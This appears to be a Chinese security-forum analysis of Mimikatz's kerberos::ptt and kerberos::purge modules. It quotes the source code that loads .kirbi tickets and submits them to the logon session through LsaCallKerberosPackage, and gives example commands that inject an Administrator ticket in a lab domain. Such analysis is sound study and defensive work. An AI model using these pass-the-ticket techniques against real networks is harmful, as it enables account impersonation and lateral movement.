Mimikatz Explorer - Kerberos PTT &amp; Purge
============================================

Mimikatz 的 `kerberos::ptt` 功能可以将现有的 Kerberos 票据提交到内存中，也就是常说的 “票据传递”。 `kerberos::purge` 功能用于将当前会话缓存的 Kerberos 票据清空。

TL;DR
=====

KERB\_SUBMIT\_TKT\_REQUEST
--------------------------

KERB\_SUBMIT\_TKT\_REQUEST 结构用于向 Kerberos 颁发机构（KDC）提交票据请求。该结构体没有公开在微软文档中，其语法如下：

```cpp
typedef struct _KERB_SUBMIT_TKT_REQUEST {
    KERB_PROTOCOL_MESSAGE_TYPE MessageType;
    LUID LogonId;
    ULONG Flags;
    KERB_CRYPTO_KEY32 Key; // key to decrypt KERB_CRED
    ULONG KerbCredSize;
    ULONG KerbCredOffset;
} KERB_SUBMIT_TKT_REQUEST, *PKERB_SUBMIT_TKT_REQUEST;  
```

主要介绍以下成员：

- MessageType：标识正在发出的请求类型的 KERB\_PROTOCOL\_MESSAGE\_TYPE 值。此成员必须设置为 KerbSubmitTicketMessage。
- Key：用于解密 Kerberos 凭据（KRB\_CRED）的加密密钥。
- KerbCredSize：表示 KRB\_CRED 数据的大小（以字节为单位），即 KRB\_CRED 凭据的长度。
- KerbCredOffset：表示 KRB\_CRED 数据在整个消息中的偏移量，即 Kerberos 凭据的起始位置。

KerbSubmitTicketMessage 调度例程从 KDC 获取票证并更新票证缓存。需要 SeTcbPrivilege 才能访问另一个登录帐户的票证缓存。

在 LsaCallAuthenticationPackage 函数中使用 KERB\_SUBMIT\_TKT\_REQUEST 时，需要扩展 KERB\_SUBMIT\_TKT\_REQUEST 结构体的大小，将 KRB\_CRED 数据追加到 KERB\_SUBMIT\_TKT\_REQUEST 结构后面，并将 KRB\_CRED 数据在整个 KERB\_SUBMIT\_TKT\_REQUEST 消息中的偏移量给到 KerbCredOffset。

Mimikatz 的 `kerberos::ptt` 通过 LsaCallAuthenticationPackage 函数发送 KERB\_SUBMIT\_TKT\_REQUEST 消息，将现有的 Kerberos 票据传递（文件或二进制数据）到内存中。

KERB\_PURGE\_TKT\_CACHE\_REQUEST
--------------------------------

KERB\_PURGE\_TKT\_CACHE\_REQUEST 结构包含用于从票证缓存中删除条目的信息。

该结构语法如下：

```cpp
typedef struct _KERB_PURGE_TKT_CACHE_REQUEST {
    KERB_PROTOCOL_MESSAGE_TYPE MessageType;
    LUID                       LogonId;
    UNICODE_STRING             ServerName;
    UNICODE_STRING             RealmName;
} KERB_PURGE_TKT_CACHE_REQUEST, *PKERB_PURGE_TKT_CACHE_REQUEST;
```

- MessageType：标识正在发出的请求类型的 KERB\_PROTOCOL\_MESSAGE\_TYPE 值。此成员必须设置为 KerbPurgeTicketCacheMessage。
- LogonId：包含登录会话标识符的 LUID 结构。
- ServerName：包含应从缓存中删除票证的服务的名称，为 UNICODE\_STRING 字符串。
- RealmName：包含应从缓存中删除票证的领域的名称，为 UNICODE\_STRING 字符串。

如果 ServerName 和 RealmName 均为零长度， LsaCallAuthenticationPackage 将删除由 LogonId 标识的登录会话的所有票证。否则， LsaCallAuthenticationPackage 将搜索 ServerName@RealmName 的缓存票证，并删除所有此类票证。

KerbPurgeTicketCacheMessage 调度例程允许从用户登录会话的票证缓存中删除选定的票证。它还可以删除缓存的所有票证。

Mimikatz 的 `kerberos::purge` 通过 LsaCallAuthenticationPackage 函数发送 KERB\_PURGE\_TKT\_CACHE\_REQUEST 消息，将当前会话中的 Kerberos 票据传递清空。

Main Detail
===========

PTT
---

Mimikatz 的 `kerberos::ptt` 功能可以将现有的 Kerberos 票据提交到内存中，也就是常说的 “票据传递”。

根据 `ptt` 功能的名称找到其入口函数 kuhl\_m\_kerberos\_ptt：

- kerberos\\kuhl\_m\_kerberos.c

```cpp
NTSTATUS kuhl_m_kerberos_ptt(int argc, wchar_t* argv[])
{
    int i;
    for (i = 0; i < argc; i++)
    {
        if (PathIsDirectory(argv[i]))
        {
            kprintf(L"* Directory: \'%s\'\n", argv[i]);
            kull_m_file_Find(argv[i], L"*.kirbi", FALSE, 0, FALSE, FALSE, kuhl_m_kerberos_ptt_directory, NULL);
        }
        else kuhl_m_kerberos_ptt_directory(0, argv[i], PathFindFileName(argv[i]), NULL);
    }
    return STATUS_SUCCESS;
}
```

该函数内部，首先通过 PathIsDirectory 如函数判断用户提供的参数是否是目录，如果是，则通过 kull\_m\_file\_Find 获取该目录中所有后缀为 .kirbi 的票据文件，并对每个票据文件执行回调函数 kuhl\_m\_kerberos\_ptt\_directory。如果不是目录，则直接对该文件调用 kuhl\_m\_kerberos\_ptt\_directory 函数。

跟进 kuhl\_m\_kerberos\_ptt\_directory 函数：

- kerberos\\kuhl\_m\_kerberos.c

```cpp
BOOL CALLBACK kuhl_m_kerberos_ptt_directory(DWORD level, PCWCHAR fullpath, PCWCHAR path, PVOID pvArg)
{
    if (fullpath)
    {
        kprintf(L"\n* File: \'%s\': ", fullpath);
        kuhl_m_kerberos_ptt_file(fullpath);
    }
    return FALSE;
}
```

该函数直接对提供的票据文件调用 kuhl\_m\_kerberos\_ptt\_file 函数。

跟进 kuhl\_m\_kerberos\_ptt\_file 函数：

- kerberos\\kuhl\_m\_kerberos.c

```cpp
void kuhl_m_kerberos_ptt_file(PCWCHAR filename)
{
    PBYTE fileData;
    DWORD fileSize;
    NTSTATUS status;
    if (kull_m_file_readData(filename, &fileData, &fileSize))
    {
        status = kuhl_m_kerberos_ptt_data(fileData, fileSize);
        if (NT_SUCCESS(status))
            kprintf(L"OK\n");
        else
            PRINT_ERROR(L"LsaCallKerberosPackage %08x\n", status);
        LocalFree(fileData);
    }
    else PRINT_ERROR_AUTO(L"kull_m_file_readData");
}
```

在 kuhl\_m\_kerberos\_ptt\_file 函数内部，首先通过 kull\_m\_file\_readData 函数将文件保存的票据数据读取出来，并保存到 fileData 所指向的内存中，fileSize 中保存了票据数据的大小。

跟进 kull\_m\_file\_readData 函数：

- modules\\kull\_m\_file.c

```cpp
BOOL kull_m_file_readData(PCWCHAR fileName, PBYTE * data, PDWORD lenght)    // for ""little"" files !
{
    return kull_m_file_readGeneric(fileName, data, lenght, 0);
}
```

其直接调用 kull\_m\_file\_readGeneric 函数，跟进 kull\_m\_file\_readGeneric 函数：

- modules\\kull\_m\_file.c

```cpp
BOOL kull_m_file_readGeneric(PCWCHAR fileName, PBYTE * data, PDWORD lenght, DWORD flags)
{
    BOOL reussite = FALSE;
    DWORD dwBytesReaded;
    LARGE_INTEGER filesize;
    HANDLE hFile = NULL;

    if(isBase64InterceptInput)
    {
        if(!(reussite = kull_m_string_quick_base64_to_Binary(fileName, data, lenght)))
            PRINT_ERROR_AUTO(L"kull_m_string_quick_base64_to_Binary");
    }
    else if((hFile = CreateFile(fileName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, flags, NULL)) && hFile != INVALID_HANDLE_VALUE)
    {
        if(GetFileSizeEx(hFile, &filesize) && !filesize.HighPart)
        {
            *lenght = filesize.LowPart;
            if(*data = (PBYTE) LocalAlloc(LPTR, *lenght))
            {
                if(!(reussite = ReadFile(hFile, *data, *lenght, &dwBytesReaded, NULL) && (*lenght == dwBytesReaded)))
                    LocalFree(*data);
            }
        }
        CloseHandle(hFile);
    }
    return reussite;
}
```

可以看到，在 kull\_m\_file\_readGeneric 函数中，如果 isBase64InterceptInput 为 TRUE，则通过 kull\_m\_string\_quick\_base64\_to\_Binary 函数解密 Base64 编码格式的票据，并将解密后的内容保存到 data 中。但是 isBase64InterceptInput 默认为 FALSE，因此将调用 ReadFile 函数将票据内容读取到 data 中。

回到 kuhl\_m\_kerberos\_ptt\_file 函数中，将对 fileData 和 fileSize 调用 kuhl\_m\_kerberos\_ptt\_data 函数，在该函数中执行真正的“票据传递”过程。

跟进 kuhl\_m\_kerberos\_ptt\_data 函数：

- kerberos\\kuhl\_m\_kerberos.c

```cpp
NTSTATUS kuhl_m_kerberos_ptt_data(PVOID data, DWORD dataSize)
{
    NTSTATUS status = STATUS_MEMORY_NOT_ALLOCATED, packageStatus;
    DWORD submitSize, responseSize;
    PKERB_SUBMIT_TKT_REQUEST pKerbSubmit;
    PVOID dumPtr;

    submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + dataSize;
    if (pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST)LocalAlloc(LPTR, submitSize))
    {
        pKerbSubmit->MessageType = KerbSubmitTicketMessage;
        pKerbSubmit->KerbCredSize = dataSize;
        pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
        RtlCopyMemory((PBYTE)pKerbSubmit + pKerbSubmit->KerbCredOffset, data, dataSize);

        status = LsaCallKerberosPackage(pKerbSubmit, submitSize, &dumPtr, &responseSize, &packageStatus);
        if (NT_SUCCESS(status))
        {
            status = packageStatus;
            if (!NT_SUCCESS(status))
                PRINT_ERROR(L"LsaCallAuthenticationPackage KerbSubmitTicketMessage / Package : %08x\n", status);
        }
        else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbSubmitTicketMessage : %08x\n", status);

        LocalFree(pKerbSubmit);
    }
    return status;
}
```

该函数首先声明了一个 KERB\_SUBMIT\_TKT\_REQUEST 结构的指针变量 pKerbSubmit。然后扩展了 KERB\_SUBMIT\_TKT\_REQUEST 结构的大小，如下所示。

```cpp
submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + dataSize;
if (pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST)LocalAlloc(LPTR, submitSize))
{
    // ...
}
```

这里 pKerbSubmit 在原来 sizeof(KERB\_SUBMIT\_TKT\_REQUEST) 大小的基础上增加了 dataSize，以保证后续将票据数据追加到 pKerbSubmit 指向的内存中。

然后设置 pKerbSubmit 中的成员，必须将 MessageType 成员设为 KerbSubmitTicketMessage，KerbCredSize 设为票据数据的大小 dataSize，KerbCredOffset 设置追加的票据数据相对于 KERB\_SUBMIT\_TKT\_REQUEST 结构起始位置的偏移量，并通过 RtlCopyMemory 将票据数据追加到 pKerbSubmit 扩展出来的内存中，如下所示。

```cpp
pKerbSubmit->MessageType = KerbSubmitTicketMessage;
pKerbSubmit->KerbCredSize = dataSize;
pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
RtlCopyMemory((PBYTE)pKerbSubmit + pKerbSubmit->KerbCredOffset, data, dataSize);
```

最后，通过调用 LsaCallKerberosPackage 函数发送 KerbSubmitTicketMessage 消息请求，将该票据提交到当前会话缓存中，完成票据传递过程。

最终执行效果如下：

```cmd
mimikatz.exe "kerberos::ptt 4-40850000-Administrator@LDAP~DC01.pentest.com~pentest.com-PENTEST.COM.kirbi" exit
```

![image-20230511143221761](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-e7904798e68148652ce23a38ac5bd64bd155bd42.png)

Purge
-----

`kerberos::purge` 功能用于将当前会话缓存的 Kerberos 票据清空。

根据 `purge` 功能的名称找到其入口函数 kuhl\_m\_kerberos\_purge：

- kerberos\\kuhl\_m\_kerberos.c

```cpp
NTSTATUS kuhl_m_kerberos_purge(int argc, wchar_t* argv[])
{
    NTSTATUS status, packageStatus;
    KERB_PURGE_TKT_CACHE_REQUEST kerbPurgeRequest = { KerbPurgeTicketCacheMessage, {0, 0}, {0, 0, NULL}, {0, 0, NULL} };
    PVOID dumPtr;
    DWORD responseSize;

    status = LsaCallKerberosPackage(&kerbPurgeRequest, sizeof(KERB_PURGE_TKT_CACHE_REQUEST), &dumPtr, &responseSize, &packageStatus);
    if (NT_SUCCESS(status))
    {
        if (NT_SUCCESS(packageStatus))
            kprintf(L"Ticket(s) purge for current session is OK\n");
        else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbPurgeTicketCacheMessage / Package : %08x\n", packageStatus);
    }
    else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbPurgeTicketCacheMessage : %08x\n", status);

    return STATUS_SUCCESS;
}
```

该函数首先声明了一个 KERB\_PURGE\_TKT\_CACHE\_REQUEST 结构的变量 kerbPurgeRequest，并将 MessageType 成员设为 KerbPurgeTicketCacheMessage，以表示从用户登录会话的票证缓存中删除选定的票证。然后将 kerbPurgeRequest 的其余成员设为 0 或 NULL，以表示删除当前会话缓存的所有票证。

最终执行效果如下：

```cmd
mimikatz.exe "kerberos::purge" exit
```

![image-20230511150153867](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-10e631c637e35919fd2742beed6795c530d26360.png)